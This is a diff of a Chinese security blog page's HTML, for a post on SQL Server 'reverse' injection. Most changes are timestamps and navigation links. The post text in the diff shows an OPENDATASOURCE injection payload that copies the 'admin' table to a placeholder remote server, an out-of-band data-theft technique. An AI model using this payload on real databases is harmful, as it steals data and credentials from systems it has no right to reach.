@@ -17,7 +17,7 @@
 <meta property="og:site_name" content="Crustsalt&#39;s Blog">
 <meta property="og:description" content="主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。 这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-11-01T14:50:26.600Z">
+<meta property="og:updated_time" content="2019-11-12T03:42:38.034Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQLSever的反弹注入">
 <meta name="twitter:description" content="主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。 这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）">
@@ -291,7 +291,9 @@
       
           
         <p>主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。</p>
-<p>这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）<br><a id="more"></a><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=服务器;uid=登陆的用户名;pwd=登陆的密码;database=数据库名'</span>).数据库名.dbo.数据库中的表名 <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
+<p>这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）</p>
+<a id="more"></a>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=服务器;uid=登陆的用户名;pwd=登陆的密码;database=数据库名'</span>).数据库名.dbo.数据库中的表名 <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>select * from admin –</p>
 </blockquote>
@@ -311,7 +313,7 @@
         <p><span>本文标题:</span><a  href="/2019/10/14/sqlsever反弹注入/">SQLSever的反弹注入</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 Crustsalt 的个人博客">Crustsalt</a></p>
         <p><span>发布时间:</span>2019年10月14日 - 23时08分</p>
-        <p><span>最后更新:</span>2019年11月01日 - 22时50分</p>
+        <p><span>最后更新:</span>2019年11月12日 - 11时42分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/10/14/sqlsever反弹注入/" title="SQLSever的反弹注入">/2019/10/14/sqlsever反弹注入/</a>
             <span class="copy-path" data-clipboard-text="原文: /2019/10/14/sqlsever反弹注入/　　作者: Crustsalt" title=""></span>
@@ -334,11 +336,6 @@
       </div>
     </a>
   
-  
-    <a  href="/2019/10/14/整数反转/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">整数反转</div>
-      <strong class="article-nav-caption">></strong>
-    </a>
   
 </nav>
 
@@ -415,12 +412,10 @@
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2019/10/14/整数反转/" title="下一篇: 整数反转">
-                <i class="fa fa-angle-right"></i>
-            </a>
+            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/11/12/键盘消息钩取学习/">键盘消息钩取学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/08/密码学实验/">密码学实验</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/07/文件上传靶场/">文件上传靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/02/Sqli/">Sqli-lab 1-65关放弃指北</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/01/套接字编程学习/">套接字编程学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/31/PhpStudy_RCE漏洞复现/">PhpStudy RCE漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/30/Windows API编程/">Windows API编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/28/Java-容器学习/">Java-容器学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/非递减数列/">非递减数列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/两数之和/">两数之和</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/sqlsever反弹注入/">SQLSever的反弹注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/整数反转/">整数反转</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/11/12/键盘消息钩取学习/">键盘消息钩取学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/08/密码学实验/">密码学实验</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/07/文件上传靶场/">文件上传靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/02/Sqli/">Sqli-lab 1-65关放弃指北</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/01/套接字编程学习/">套接字编程学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/31/PhpStudy_RCE漏洞复现/">PhpStudy RCE漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/30/Windows API编程/">Windows API编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/28/Java-容器学习/">Java-容器学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/非递减数列/">非递减数列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/整数反转/">整数反转</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/两数之和/">两数之和</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/sqlsever反弹注入/">SQLSever的反弹注入</a></li></ul>
     
 <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 
